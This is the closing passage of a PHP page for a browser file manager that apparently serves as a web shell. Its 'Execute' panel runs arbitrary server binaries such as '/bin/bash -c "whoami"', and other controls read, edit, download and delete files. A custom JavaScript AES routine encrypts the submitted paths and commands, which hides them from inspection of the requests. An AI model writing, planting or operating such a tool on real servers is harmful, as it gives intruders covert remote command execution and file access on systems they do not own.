      <!-- Welcome -->
      <div id="panelWelcome" class="panel-body">
        <div class="panel-welcome">
          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
            <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>
          </svg>
          <p>Select a file from the sidebar to open it.</p>
          <p style="font-size:11px;color:var(--dim)">Hover a row to see Read / DL / Run buttons.</p>
        </div>
      </div>

      <!-- Editor -->
      <div id="panelEditor" class="panel-body panel-hidden">
        <div class="editor-topbar">
          <span style="font-size:11px;color:var(--muted);white-space:nowrap">File:</span>
          <input type="text" id="visFilename" placeholder="filename.txt" value="<?= $open_file ?>"/>
        </div>
        <textarea id="TxtContent" class="editor"><?= $editor_content ?></textarea>
        <div class="editor-actions">
          <button type="submit" class="btn btn-success" id="BtnWrite"
                  onclick="return FM.prepSave();">Save</button>
          <button type="submit" class="btn btn-danger" id="BtnCancelEdit"
                  onclick="_clearHidden();document.getElementById('hAction').value='cancel_edit';">Close</button>
        </div>
      </div>

      <!-- Execute -->
      <div id="panelExec" class="panel-body panel-hidden">
        <div class="exec-topbar">
          <span style="font-size:11px;color:var(--muted);white-space:nowrap">Exe:</span>
          <input type="text" id="visExePath" class="exec-path" value="<?= $run_exe ?>" placeholder="/bin/bash"/>
        </div>
        <div class="exec-args-row">
          <label>Args:</label>
          <input type="text" name="exeArgs" id="TxtExeArgs" placeholder="-c &quot;whoami&quot;"/>
        </div>
        <?php if ($exec_output !== null): ?>
        <pre class="console" id="execResultPre" style="overflow-y:auto;white-space:pre-wrap;word-break:break-all;"><?= htmlspecialchars($exec_output) ?></pre>
        <?php endif; ?>
        <div class="exec-actions">
          <button type="submit" class="btn btn-run" id="BtnExec"
                  onclick="return FM.prepExec();">Run</button>
          <button type="submit" class="btn btn-danger" id="BtnCancelExec"
                  onclick="_clearHidden();document.getElementById('hAction').value='cancel_exec';">Close</button>
        </div>
      </div>

    </div><!-- /main -->
  </div><!-- /layout -->

<?php endif; ?>

<script>
// ============================================================
// FM — File Manager client namespace
// ============================================================
var FM = (function() {

  // ── AES-256-CBC (pure JS, works on plain HTTP) ──────────────
  var _key = null;

  function _initAes(hexKey) {
    if (!hexKey) return;
    _key = new Uint8Array(hexKey.length / 2);
    for (var i = 0; i < hexKey.length; i += 2)
      _key[i/2] = parseInt(hexKey.substr(i, 2), 16);
    _buildTables();
  }

  var _sb=[],_m2=[],_m3=[],_rcon=[];
  function _buildTables() {
    var p=1,q=1;
    do {
      p=p^(p<<1)^(p&0x80?0x1B:0); p&=0xFF;
      q^=q<<1; q^=q<<2; q^=q<<4; q^=(q&0x80?0x09:0); q&=0xFF;
      _sb[p]=((q^((q<<1)|(q>>7))^((q<<2)|(q>>6))^((q<<3)|(q>>5))^((q<<4)|(q>>4)))^0x63)&0xFF;
    } while(p!==1);
    _sb[0]=0x63;
    for(var i=0;i<256;i++){ _m2[i]=i<128?(i<<1)&0xFF:((i<<1)^0x1B)&0xFF; _m3[i]=(_m2[i]^i)&0xFF; }
    var c=1; for(var r=0;r<10;r++){ _rcon[r]=c; c=_m2[c]; }
  }

  function _expandKey(k) {
    var nk=8,nr=14,w=[];
    for(var i=0;i<nk;i++) w[i]=[k[4*i],k[4*i+1],k[4*i+2],k[4*i+3]];
    for(var i=nk;i<4*(nr+1);i++){
      var t=w[i-1].slice();
      if(i%nk===0) t=[_sb[t[1]]^_rcon[i/nk-1],_sb[t[2]],_sb[t[3]],_sb[t[0]]];
      else if(nk>6&&i%nk===4) t=t.map(function(x){return _sb[x];});
      w[i]=[w[i-nk][0]^t[0],w[i-nk][1]^t[1],w[i-nk][2]^t[2],w[i-nk][3]^t[3]];
    }
    var rk=[];
    for(var i=0;i<=nr;i++) rk[i]=w.slice(4*i,4*i+4);
    return rk;
  }

  function _aesBlock(b, rk) {
    var s=[[],[],[],[]];
    for(var c=0;c<4;c++) for(var r=0;r<4;r++) s[r][c]=b[4*c+r];
    var ark=function(k){for(var c=0;c<4;c++) for(var r=0;r<4;r++) s[r][c]^=k[c][r];};
    var sub=function(){for(var r=0;r<4;r++) for(var c=0;c<4;c++) s[r][c]=_sb[s[r][c]];};
    var shr=function(){for(var r=1;r<4;r++) for(var i=0;i<r;i++){var t=s[r][0];s[r][0]=s[r][1];s[r][1]=s[r][2];s[r][2]=s[r][3];s[r][3]=t;}};
    var mix=function(){for(var c=0;c<4;c++){var a=s[0][c],b=s[1][c],d=s[2][c],e=s[3][c];s[0][c]=_m2[a]^_m3[b]^d^e;s[1][c]=a^_m2[b]^_m3[d]^e;s[2][c]=a^b^_m2[d]^_m3[e];s[3][c]=_m3[a]^b^d^_m2[e];}};
    ark(rk[0]);
    for(var rd=1;rd<=13;rd++){sub();shr();mix();ark(rk[rd]);}
    sub();shr();ark(rk[14]);
    var o=new Uint8Array(16);
    for(var c=0;c<4;c++) for(var r=0;r<4;r++) o[4*c+r]=s[r][c];
    return o;
  }

  function _utf8(str) {
    var out=[];
    for(var i=0;i<str.length;i++){
      var c=str.charCodeAt(i);
      if(c<0x80) out.push(c);
      else if(c<0x800){ out.push(0xC0|(c>>6)); out.push(0x80|(c&0x3F)); }
      else { out.push(0xE0|(c>>12)); out.push(0x80|((c>>6)&0x3F)); out.push(0x80|(c&0x3F)); }
    }
    return new Uint8Array(out);
  }

  function _aesEncrypt(plainText) {
    if (!_key || !plainText) return '';
    var rk=_expandKey(_key), iv=new Uint8Array(16);
    for(var i=0;i<16;i++) iv[i]=Math.floor(Math.random()*256);
    var tb=_utf8(plainText), pad=16-(tb.length%16);
    var buf=new Uint8Array(tb.length+pad); buf.set(tb);
    for(var i=tb.length;i<buf.length;i++) buf[i]=pad;
    var out=new Uint8Array(16+buf.length); out.set(iv,0);
    var prev=iv;
    for(var i=0;i<buf.length;i+=16){
      var blk=new Uint8Array(16);
      for(var j=0;j<16;j++) blk[j]=buf[i+j]^prev[j];
      var enc=_aesBlock(blk,rk); out.set(enc,16+i); prev=enc;
    }
    return btoa(String.fromCharCode.apply(null,out))
      .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
  }

  function _b64(str) {
    try { return btoa(unescape(encodeURIComponent(str))); }
    catch(e) { return btoa(str); }
  }

  // ── Hidden field helpers ─────────────────────────────────────
  function _hid(name)      { return document.querySelector('[name="'+name+'"]'); }
  function _set(name, val) { var h=_hid(name); if(h) h.value=val||''; }
  function _get(id)        { var el=document.getElementById(id); return el?el.value:''; }

  // ── Panel switching ──────────────────────────────────────────
  function showPanel(name) {
    ['welcome','editor','exec'].forEach(function(p){
      var panel = document.getElementById('panel'+p.charAt(0).toUpperCase()+p.slice(1));
      var tab   = document.getElementById('tab'  +p.charAt(0).toUpperCase()+p.slice(1));
      if (panel) panel.classList.toggle('panel-hidden', p!==name);
      if (tab)   tab.classList.toggle('active', p===name);
    });
  }

  function closeTab(name, e) {
    if (e) e.stopPropagation();
    var closeBtn = name==='editor'
      ? document.getElementById('BtnCancelEdit')
      : document.getElementById('BtnCancelExec');
    if (closeBtn) closeBtn.click();
  }

  // ── Listing actions ──────────────────────────────────────────
  function cdDir(enc) {
    _clearHidden();
    _set('__CDDIR', enc);
    document.getElementById('fm').submit();
  }

  function readFile(enc) {
    _clearHidden();
    _set('__RDFILE', enc);
    document.getElementById('fm').submit();
  }

  function runExe(enc) {
    _clearHidden();
    _set('__RUNEXE', enc);
    document.getElementById('fm').submit();
  }

  function downloadFile(enc) {
    _clearHidden();
    _set('hDownloadPath', enc);
    document.getElementById('BtnDownload').click();
  }

  // ── Button pre-submit helpers ────────────────────────────────
  function prepGo() {
    _clearHidden();
    _set('hPath', _aesEncrypt(_get('visPath')));
    _set('__ACTION', 'go');
    return true;
  }

  function prepSave() {
    _set('hFilenamePlain', _get('visFilename'));
    var ta = document.getElementById('TxtContent');
    _set('hContentPlain', ta ? _b64(ta.value) : '');
    if (ta) ta.value = '';
    _set('__ACTION', 'write');
    return true;
  }

  function prepExec() {
    _clearHidden();
    var path = _get('visExePath').replace(/\/+/g, '/').trim(); // normalize double slashes
    var el = document.getElementById('visExePath');
    if (el) el.value = path;
    _set('hExePath',      _aesEncrypt(path));
    _set('hExePathPlain', path);
    _set('__ACTION', 'exec');
    return true;
  }

  // ── Filter ───────────────────────────────────────────────────
  function filter(q) {
    q = q.toLowerCase();
    document.querySelectorAll('#sidebarList .entry').forEach(function(el){
      var nm = el.querySelector('.entry-name');
      el.style.display = (!q || (nm && nm.textContent.toLowerCase().includes(q))) ? '' : 'none';
    });
  }

  // ── Go shortcut (Enter key in path box) ─────────────────────
  function go() {
    _set('hPath', _aesEncrypt(_get('visPath')));
    _set('__ACTION', 'go');
    document.getElementById('BtnGo').click();
  }

  // ── Resizable sidebar ────────────────────────────────────────
  function _initResize() {
    var handle = document.getElementById('resizeHandle');
    var sidebar = document.getElementById('sidebar');
    if (!handle || !sidebar) return;
    var dragging=false, startX, startW;
    handle.addEventListener('mousedown', function(e){
      dragging=true; startX=e.clientX; startW=sidebar.offsetWidth;
      handle.classList.add('dragging');
      document.body.style.cssText += ';cursor:col-resize;user-select:none';
    });
    document.addEventListener('mousemove', function(e){
      if (!dragging) return;
      var w=Math.min(500,Math.max(160,startW+(e.clientX-startX)));
      sidebar.style.width=sidebar.style.minWidth=sidebar.style.maxWidth=w+'px';
    });
    document.addEventListener('mouseup', function(){
      if (!dragging) return; dragging=false;
      handle.classList.remove('dragging');
      document.body.style.cursor=document.body.style.userSelect='';
    });
  }

  // ── Init ─────────────────────────────────────────────────────
  function _init() {
    _initAes('<?= $auth_skey ?>');
    _initResize();

    var active     = '<?= $active_panel ?>';
    var editorFile = '<?= $open_file_js ?>';
    var execFile   = '<?= $run_exe_js ?>';
    var isNew      = <?= $is_new_file ? 'true' : 'false' ?>;

    if (editorFile || isNew) {
      var tab = document.getElementById('tabEditor');
      if (tab) tab.style.display = '';
      var lbl = document.getElementById('tabEditorName');
      if (lbl) lbl.textContent = editorFile ? editorFile.split(/[\\/]/).pop() || 'Editor' : 'New File';
    }
    if (execFile || active==='exec') {
      var tab = document.getElementById('tabExec');
      if (tab) tab.style.display = '';
      var lbl = document.getElementById('tabExecName');
      if (lbl) lbl.textContent = execFile ? (execFile.split(/[\\/]/).pop() || 'Execute') : 'Execute';
      var ve  = document.getElementById('visExePath');
      var hep = document.getElementById('hExePathPlain');
      if (ve && execFile)  ve.value  = execFile;
      if (hep && execFile) hep.value = execFile;
    }

    if      (active==='editor' && (editorFile||isNew)) showPanel('editor');
    else if (active==='exec')                           showPanel('exec');
    else                                                showPanel('welcome');
  }

  window.addEventListener('load', _init);

  return { showPanel:showPanel, closeTab:closeTab, filter:filter, go:go,
           prepGo:prepGo, prepSave:prepSave, prepExec:prepExec };

})(); // end FM

// Global helpers called from inline onclick attributes
function _clearEditor() { var ta=document.getElementById('TxtContent'); if(ta) ta.value=''; }
function _clearHidden() {
  _clearEditor();
  ['__CDDIR','__RDFILE','__RUNEXE','__DELFILE','hPath','hFilename','hExePath',
   'hDownloadPath','hExePathPlain','hFilenamePlain','hContentPlain','__ACTION'].forEach(function(n){
    var h=document.querySelector('[name="'+n+'"]'); if(h) h.value='';
  });
}
function cdDir(e)        { _clearHidden(); var h=document.querySelector('[name="__CDDIR"]');  if(h) h.value=e; document.getElementById('fm').submit(); }
function readFile(e)     { _clearHidden(); var h=document.querySelector('[name="__RDFILE"]'); if(h) h.value=e; document.getElementById('fm').submit(); }
function runExe(e)       { _clearHidden(); var h=document.querySelector('[name="__RUNEXE"]'); if(h) h.value=e; document.getElementById('fm').submit(); }
function downloadFile(e) { _clearHidden(); var h=document.querySelector('[name="hDownloadPath"]'); if(h) h.value=e; document.getElementById('BtnDownload').click(); }
function deleteFile(e, name) {
  if (!confirm('Delete "' + name + '"?\n\nThis cannot be undone.')) return;
  _clearHidden();
  var h=document.querySelector('[name="__DELFILE"]'); if(h) h.value=e;
  document.getElementById('fm').submit();
}
</script>

</form>
</body>
</html>